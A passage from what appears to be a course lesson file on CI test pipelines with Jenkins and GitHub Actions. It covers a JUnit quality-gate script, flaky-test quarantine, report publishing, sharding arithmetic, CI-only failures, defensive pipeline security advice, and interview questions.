if (flaky.length > maxFlaky) problems.push(\`\${flaky.length} flaky, budget is \${maxFlaky}: \${flaky.map((c) => c.id).join(', ')}\`)
if (expired.length) problems.push(\`quarantine expired: \${expired.map((q) => \`\${q.id} (\${q.owner}, \${q.ticket})\`).join(', ')}\`)

console.log(\`executed=\${executed.length} failed=\${blocking.length} quarantined=\${tolerated.length} flaky=\${flaky.length}\`)
problems.forEach((p) => console.error(\`GATE: \${p}\`))
process.exit(problems.length ? 1 : 0)
\`\`\`

**Step by step**

- Reads JUnit XML from any runner (Surefire/Failsafe, Playwright's junit reporter). The regular expression allows \`>\` inside attribute values, because scenario names contain it.
- \`flakyFailure\`/\`flakyError\` elements are what Surefire writes for tests that passed on rerun (providers that support reruns). With a TestNG retry analyzer the first attempt appears as *skipped*, so count those in a listener instead (\`selenium-deep-troubleshooting-flaky-tests\`).
- **Quarantine has an expiry date and an owner.** An expired entry fails the build, so it cannot become a graveyard. A quarantined test still runs and is still reported; it just does not block.
- \`--min-tests\` catches the deadliest failure: green because nothing ran. A compile error or crashed fork produces no XML, so the gate fails even though Maven's failures were ignored.

### Rerun and quarantine policy

1. **At most one rerun**, of failed tests only, always reported as *flaky*, never as *passed*. The first result is kept.
2. **No rerun on the PR for tests the PR changes.** New tests must prove stability (repeat 10×).
3. A test that flakes twice in a week is quarantined within a day: tag, ticket, owner, expiry (two sprints at most). Then fix, delete or move to a lower level.
4. If more than about 5 % fail at the same time, suspect the environment and **stop retrying**; abort early (\`skipAfterFailureCount\`, Playwright \`maxFailures\`).
5. Publish the flaky rate and the top ten. Problem \`fw-026\` lets you practise that argument with a manager.

## 11. Reports and notifications

- **Three layers:** machine-readable JUnit XML (trend, gate), a human report (Allure, Playwright HTML) and raw evidence (screenshots, traces, logs). Publish all three on failure, XML + report on success.
- **Retention:** PR evidence 7–14 days, release certification for as long as audit requires.
- Jenkins' default Content Security Policy blocks scripts in archived HTML; use the Allure plugin or serve reports from a separate site rather than weakening the header globally.
- **Notify on change** (\`regression\`, \`fixed\`) in the channel of the people who can act. One message: branch, result vs previous, counts, top failures, owner, link. An \`@here\` per red PR build trains people to mute you.
- Stakeholder reporting (trend, risk, flaky rate instead of raw pass %) is problem \`fw-034\`.

## 12. Making it fast

Measure first: time per stage, queue time, the slowest 20 tests. Then, in order of return:

| Lever | How | Typical gain | Watch out |
|---|---|---|---|
| Delete and push down | move validation checks from UI to API/unit | largest, permanent | agree the risk with developers |
| API setup instead of UI setup | login/cart by API or storage state | 20–50 % per test | keep one UI journey |
| Parallel in process | TestNG threads, Playwright workers | up to cores | shared data; CPU saturation causes flakiness |
| Shards over machines | matrix, \`--shard\`, tags | near linear until setup dominates | balance by duration, not by count |
| Caching | \`~/.m2\`, npm cache, Docker layers | 1–4 min per job | key on the lock file; never cache \`target/\` or results |
| Prebuilt image | tools + dependencies in the image | 1–3 min per job | rebuild on lock change |
| Test impact selection | only affected tests on the PR | 50–90 % of PR time | always run everything after merge |
| Fail fast | cheap gates first, \`maxFailures\` | minutes on red builds | keep \`fail-fast: false\` for matrices you need complete |

**The shard arithmetic.** With 60 minutes of test time, 4 minutes of setup per job and N shards: \`time ≈ 4 + 60/N\`. N=4 → 19, N=8 → 11.5, N=16 → 7.75 minutes; doubling from 8 to 16 saves under 4 minutes while adding 8 × 4 = 32 machine-minutes of setup. And the longest single test is a floor.

### Test impact selection

| | Path-to-tag map | Tool-supported (Playwright \`--only-changed\`) | Coverage-based | None (run all) |
|---|---|---|---|---|
| How | script maps changed paths to tags | import graph of *test* code | record which tests touch which code | — |
| Advantages | simple, transparent | zero maintenance | precise | safe |
| Disadvantages | map goes stale | sees test files and their imports, not the app behind the URL | heavy instrumentation, hard for E2E | slow |
| Scalability | good for modular apps | good for test-only changes | big organisations | small suites |
| When | monorepo PRs | test repository PRs | mature platform teams | after merge, nightly |

\`\`\`bash
#!/usr/bin/env bash
# ci/affected-tags.sh: needs full history (checkout with fetch-depth: 0)
set -euo pipefail
changed=$(git diff --name-only "origin/\${TARGET_BRANCH:-main}...HEAD")
tags="@smoke"                                        # always
grep -q  '^public/practice-site/cart'     <<< "$changed" && tags="$tags or @cart"
grep -q  '^public/practice-site/checkout' <<< "$changed" && tags="$tags or @checkout"
grep -q  '^scripts/api-server'            <<< "$changed" && tags="$tags or @api or @checkout"
# shared code or the build itself: no shortcuts
grep -qE '^(public/practice-site/(shop\\.js|site\\.css)|tests-java/pom\\.xml|ci/|Jenkinsfile)' <<< "$changed" && tags="@regression"
echo "$tags"
\`\`\`

\`git diff A...B\` (three dots) compares with the **merge base**: what this branch changed, not what main changed meanwhile. ShopEasy's \`shop.js\` holds cart, session and tax logic for every page, so it must select the full regression. **Recommended:** a small map plus the full run after merge; a wrong map then costs an hour, not a release. (Note: under \`set -e\`, \`grep … && x\` as a statement does not abort the script, because it is part of an \`&&\` list — but a final line of that form would set the exit code, which is why \`echo\` is last.)

## 13. Passes locally, fails in CI

Reproduce in the same container image first; it answers half of the table.

| Symptom | Likely difference | How to check | Fix |
|---|---|---|---|
| \`SessionNotCreatedException\`, browser does not start | no display, missing libraries, root sandbox | browser log; run the image locally | headless, the official image; details in the Selenium deep dives |
| Element not interactable only in CI | window size, fonts, zoom | screenshot, log the window size | explicit size; assert on state, not layout |
| Random timeouts | 2 vCPU runner with 8 browsers | CPU graph; run with 1 worker | fewer workers; waits on conditions |
| Date, price or sort differs | time zone (UTC), locale, encoding | print \`TZ\`, \`user.language\`, \`file.encoding\` | set explicitly in **both** places |
| \`File not found\` | case-sensitive file system, relative working directory | \`ls -la\`, \`pwd\` in the step | exact case; class-path resources |
| Passes alone, fails in the suite | order, shared user, other parallel job on the same environment | shuffle order; build numbers on the environment | data per test; \`lock\` the environment |
| \`401\`/\`null\` credentials | secret missing (fork PR, wrong environment or folder) | print whether it is *set*, never its value | fail fast at start-up with the variable's name |
| \`Connection refused\` to localhost | container's localhost; app not started; IPv6 | \`curl -v\` from the same place as the browser | health-check loop; container-visible URL |
| Works after a manual rerun | race with deployment or cache | app version before/after the run | wait for the deployed version, then test |
| Corporate proxy / certificate | CI egress rules | \`curl -v\` | proxy variables, trust store |
| Dependency differs | stale cache, floating version, SNAPSHOT | \`mvn dependency:tree\`, \`npm ls\` on both | lock, pin; change the cache key |
| Only the first build after a weekend fails | cold environment, expired token or certificate | environment logs | warm-up request; certificate alert |
| \`No space left on device\`, \`Killed\` (137) | disk or memory | \`df -h\`, \`docker system df\`, exit code | prune, smaller heap or fewer browsers |
| Build hangs | \`input\`, prompt, background process holding stdout | thread dump, \`ps\` | \`-B\`, timeouts, redirect background output |

## 14. Pipeline security

A pipeline holds credentials and can deploy; treat it as a production system.

- **Least privilege:** read-only token by default; write permissions per job; credentials in folder or environment scope; separate test accounts per environment.
- **Untrusted code:** a PR can change the Jenkinsfile, the workflow, a Maven plugin or an npm \`postinstall\`. Do not give fork PRs secrets. \`pull_request_target\` runs with secrets in the base repository's context — **never check out and execute PR code in it**. No self-hosted runners on public repositories. In Jenkins use the multibranch "trust" setting for forks.
- **Pin third-party actions to a full commit SHA.** Tags can be moved: in March 2025 the popular \`tj-actions/changed-files\` action was compromised and its existing tags were pointed at code that printed secrets into logs. Let Dependabot/Renovate update the SHA with review.
- **Prefer OIDC** (short-lived cloud credentials) to stored long-lived keys.
- **Protect the gate itself:** CODEOWNERS on \`.github/\`, \`Jenkinsfile\` and \`ci/\`; required checks that administrators cannot silently skip.
- **Jenkins hygiene:** 0 executors on the controller, agents isolated (ephemeral), plugins few and updated, no anonymous read, no credentials in job parameters, script approvals reviewed.
- **Artifacts leak:** traces, HAR files, \`.env\` copies and Allure environment files contain tokens. Review what you archive.

## Common mistakes and debugging

| Mistake or error | What it looks like | Cause → fix |
|---|---|---|
| \`java.io.NotSerializableException: java.util.regex.Matcher\` | fails at a random later step | non-serialisable local across a step → \`@NonCPS\`, null it, or do it in a script |
| \`No such DSL method 'allure'/'lock'\` | stage fails at once | plugin missing on that Jenkins → install or remove the step |
| \`Expected a step\` / \`Missing required section "agent"\` | does not start | Declarative syntax → validate with the Declarative Linter (\`POST /pipeline-model-converter/validate\`) or "Replay" |
| \`No test report files were found\` | red although tests ran | wrong glob or wrong workspace (other agent/\`dir\`) → \`sh 'find . -name "*.xml"'\` |
| Pipeline green, tests red | no error anywhere in the log summary | exit code swallowed by \`or true\` constructs, \`testFailureIgnore\`, a pipe without \`pipefail\` or an ignored \`returnStatus\` → let a gate script decide |
| \`\${params.X}\` printed literally | single-quoted Groovy string | intended for shell variables; parameters are also environment variables → \`"$X"\` |
| Two jobs break each other | shared environment or agent port | \`lock\`, one executor, ephemeral app per job |
| Required check "Expected — waiting for status" | merge blocked forever | check name changed, path filter skipped the workflow, or \`merge_group\` missing |
| Cache never hits | key contains a timestamp or run id | key on \`hashFiles('**/pom.xml')\`; caches of a PR are not visible to siblings |
| \`stash\` of 2 GB makes Jenkins slow | controller disk and network | artifacts or object storage |

## Best practices for experienced engineers

- The pipeline is code: reviewed, versioned, small, runnable locally (\`ci/*.sh\`), with owners.
- Build once, promote; print app and test commit in every report.
- One required aggregated gate; a minimum test count; a flaky budget; a quarantine with expiry.
- Timeouts at step, stage and pipeline level; a hung job is worse than a red one.
- Start ShopEasy (or the app) per job where possible; lock shared environments where not.
- Evidence always, notifications on change.
- Treat a red \`main\` as the team's first priority, or stop calling it CI.

## Equivalent in the other stack

| Concern | Java (Maven + TestNG/Cucumber) | TypeScript (Playwright Test) |
|---|---|---|
| Selecting | groups, suite files (Failsafe 3.5.x), Cucumber tags | projects, \`--grep\`, tags |
| Splitting over machines | tags or classes per matrix cell (no built-in shard) | \`--shard=i/n\` |
| One report | Allure results merged; JUnit XML | blob reports + \`merge-reports\` |
| Starting the app | \`ci/start-shopeasy.sh\` or Maven plugin phases | \`webServer\` in the config |
| Rerun | retry analyzer / \`rerunFailingTestsCount\` by provider | \`retries\`, reported as *flaky* |
| Empty-run guard | \`failIfNoTests\`, gate script | "No tests found" fails by default |
| Early abort | \`skipAfterFailureCount\` | \`maxFailures\` |

## Interview questions

### Q: Design the test pipeline for an e-commerce product with several releases a week.

**Short answer (30–60 s):** PR gate under ten minutes: compile, static, unit, contract, API and a smoke UI. After merge one artifact is built, deployed to QA and tested with a sharded regression; staging gets critical journeys with real integrations, then approval, production deploy, read-only smoke and monitoring with rollback. Cross-browser, visual and accessibility run nightly with an owner for triage.

**Detailed answer:** I order stages by information per minute, promote the same artifact, and define for every gate: signal, threshold, owner, time budget, what happens on red. I'd use an aggregated gate with a minimum test count, a flaky budget and a quarantine with expiry. Test data is created through the API, environments are health-checked and locked. I measure lead time, gate duration, flaky rate and escaped defects, and prune tests from those numbers.

### Q: Explain the Jenkins architecture. Why not run builds on the controller?

**Short answer (30–60 s):** The controller schedules, stores configuration and credentials, and interprets pipeline code; agents run the steps in executors, chosen by labels. Builds on the controller could read credentials and other jobs' data and would slow or crash the whole server, so its executors are set to zero.

**Detailed answer:** Pipeline Groovy runs CPS-transformed on the controller and is serialised after each step, so it survives restarts, needs serialisable state and must not do heavy processing. \`sh\` is a durable task on the agent. Size executors by browsers per core, and use \`agent none\` at the top so that no outer agent holds an idle executor. Ephemeral agents (containers, pods) give isolation.

### Q: Declarative or scripted pipeline?

**Short answer (30–60 s):** Declarative for Jenkinsfiles: validated structure, \`post\`, \`when\`, \`matrix\`, readable by everyone. Scripted inside shared libraries when the stages are computed dynamically.

**Detailed answer:** Both use the same engine, so performance is no argument. Declarative forces reporting into \`post\`, which prevents the most common mistake (no report on failure). My rule is that logic beyond a few lines moves to a library step or a script which can be tested and run locally.

### Q: How do you handle secrets in a pipeline?

**Short answer (30–60 s):** Store them in the CI's credential store or a vault with the smallest scope, bind them as environment variables only around the step that needs them, use single-quoted \`sh\` so the shell expands them, and never echo them. Prefer short-lived OIDC credentials.

**Detailed answer:** Double quotes make Groovy interpolate on the controller, which puts the secret into process arguments and scripts and can defeat masking; the same interpolation is an injection hole for parameters and branch names. Fork PRs get no secrets. Masking does not cover encoded values, screenshots or archived reports, so accounts are low-privilege and evidence is reviewed. If leaked: rotate first.

### Q: A UI suite takes 70 minutes. How do you bring it under 15?

**Short answer (30–60 s):** Measure, then remove and push down tests, replace UI setup with API setup, parallelise in process to the CPU limit, shard over machines balanced by duration, cache dependencies, and run only affected tests on PRs with the full suite after merge.

**Detailed answer:** Show the arithmetic \`setup + total/N\`: sharding from 8 to 16 may save four minutes and double the setup cost. Parallelism requires data isolation first, otherwise I trade time for flakiness. I'd look at the slowest twenty tests and at duplicated coverage before buying machines, and protect the gain with a time budget in the gate.

### Q: How do you deal with flaky tests in the pipeline?

**Short answer (30–60 s):** One visible rerun at most, counted as flaky; a budget in the gate; repeated offenders are quarantined within a day with owner, ticket and expiry; root causes are fixed by category. Mass failures mean environment, so no retries.

**Detailed answer:** Retrying changes the colour, not the cause. The gate keeps the first result, so product races that pass on a second attempt remain visible. Quarantined tests keep running non-blocking, which provides data for their return. Pipeline-level retry is limited to infrastructure conditions such as a lost agent.

### Q: Compare Jenkins and GitHub Actions for a test team.

**Short answer (30–60 s):** Jenkins gives full control, on-prem and any hardware, at the price of operating it. Actions is integrated with PRs, has matrices and service containers built in and needs no server, but depends on the vendor and costs minutes. I choose the one beside the code unless isolation or devices decide otherwise.

**Detailed answer:** Equivalents: shared library ↔ reusable workflow/composite action, label ↔ \`runs-on\`, \`post always\` ↔ \`if: !cancelled()\`, \`lock\` ↔ \`concurrency\`, credentials ↔ environments and secrets, \`input\` ↔ environment reviewers. Test trends are stronger in Jenkins out of the box; supply-chain risk differs: plugins on one side, third-party actions on the other. Keeping logic in scripts keeps the decision reversible.

## Scenario-based questions

### Scenario 1: "The nightly is red every morning with 60 failures and nobody looks any more"

I'd group one week of failures by exception and time: if most share a timestamp, it is the environment. Immediate steps: an environment health and version check that aborts the run early, a quarantine list with owners for the repeated offenders, so the remaining red means something; a rota with a triage deadline and a one-line result in the channel. In parallel remove the top root causes (shared users, waits). I communicate a target: ten consecutive actionable nights, and the number of quarantined tests going down. I would not raise the retry count.

### Scenario 2: "A release went out green, yet checkout was broken"

Reconstruct: did the checkout tests run? Typical finding: a tag typo selected zero scenarios, or the job was skipped by a path filter and "skipped" counted as success. Fix: minimum executed count, the aggregated gate treating skipped as failure, a critical-journey list verified by the gate (the named tests must be present *and* passed). Then look at detection after release: a read-only production smoke and monitoring of the order rate with rollback. In the review I separate "test missing", "test not run" and "test ran but did not assert".

### Scenario 3: "Management wants E2E on every PR; it takes 45 minutes"

Offer what they want (confidence before merge) within a budget: API and contract tests plus a 5-minute smoke on every PR, affected-area E2E by path map, the full regression in the merge queue or right after merge with automatic revert. Show the numbers: PRs per day × 45 minutes × runner cost, and the effect on lead time. Agree on a metric — defects found after merge that the full run would have caught — and extend the PR set if that number justifies it.

## Tricky follow-ups

**Q: Does \`post { always }\` run when the build is aborted?** A: Yes, \`always\` and \`aborted\` run, but a hard kill or a lost agent may prevent steps that need a workspace.

**Q: Why can a skipped GitHub job let a PR merge?** A: A job skipped by a condition reports success for required checks. An aggregated job with \`if: always()\` that inspects \`needs.*.result\` closes the hole.

**Q: What does \`H\` in a Jenkins cron mean?** A: A hash of the job name, so many jobs with \`H 1 * * *\` start at different minutes rather than all at 01:00.

**Q: Is \`fail-fast: true\` better because it saves money?** A: For a compile matrix, yes. For tests you lose the information whether Firefox failed as well; for shards you get a partial report.

**Q: Can the same commit pass on the PR and fail after merge?** A: Yes — main moved (semantic conflict), or the environment, data or a floating dependency differs. Merge queue, pinned dependencies and the same artifact reduce it.`,
  keyPoints: [
    'Order stages by information per minute, build once and promote the same artifact, and give every gate an owner, a threshold and a time budget.',
    'Pipeline Groovy runs CPS-transformed on the controller: keep state serialisable, put logic in scripts on the agent, and run no builds on the controller.',
    'Publish results in post { always } of each stage on its own agent; use agent none at the top, a timeout on every level, and one merged report.',
    'Retry infrastructure, not tests: conditions such as a lost agent; test reruns are limited to one and reported as flaky.',
    'Single-quoted sh lets the shell expand secrets and parameters; Groovy interpolation (and ${{ }} in run:) leaks secrets and opens injection.',
    'One aggregated required check that treats skipped and cancelled as failure, plus a minimum executed-test count, prevents green-but-empty pipelines.',
    'Speed-up follows setup + total/N: delete and push down tests, use API setup, then shard; select affected tests on PRs and run everything after merge.',
    'Pin third-party actions to a commit SHA, use least-privilege tokens, never execute fork code with secrets, and protect the pipeline files with CODEOWNERS.',
  ],
  mistakes: [
    'Ignoring Maven\'s exit code (`testFailureIgnore`, `|| true`) without a stricter gate after it — run a gate script that checks failures and a minimum executed count.',
    'Passing parameters or secrets through a double-quoted `sh` — use withCredentials/withEnv and single quotes so that the shell expands them as data.',
    'Wrapping the test stage in `retry(2)` — it hides flakiness and doubles the time on real failures; retry only lost agents and downloads.',
    'Two parallel UI stages on one agent sharing ports and `target/` — one executor per UI agent, `--strictPort`, separate workspaces.',
    'Requiring matrix job names as status checks — a renamed or skipped job blocks or passes merges silently; require one aggregated gate job.',
    'Keeping a regex Matcher or JsonSlurper result across a pipeline step (`NotSerializableException`) — use readJSON, @NonCPS without steps, or a script on the agent.',
  ],
  tryIt: `Save the lesson's \`quality-gate.mjs\` in a scratch folder, take any Surefire or Playwright JUnit XML you have (or write one with three testcases: passed, failed, flaky) and run the gate with different \`--min-tests\` and \`--max-flaky\` values. Add a \`ci/quarantine.json\` entry for the failing test, check that the gate turns green, then set its \`expires\` date to last month and watch it fail again. Finally read this repository's \`.github/workflows/deploy-pages.yml\` and write down which gate it has, what it does not check, and where you would add a ShopEasy smoke run.`,
  problems: ['fw-012', 'fw-021', 'fw-026', 'fw-034'],
}
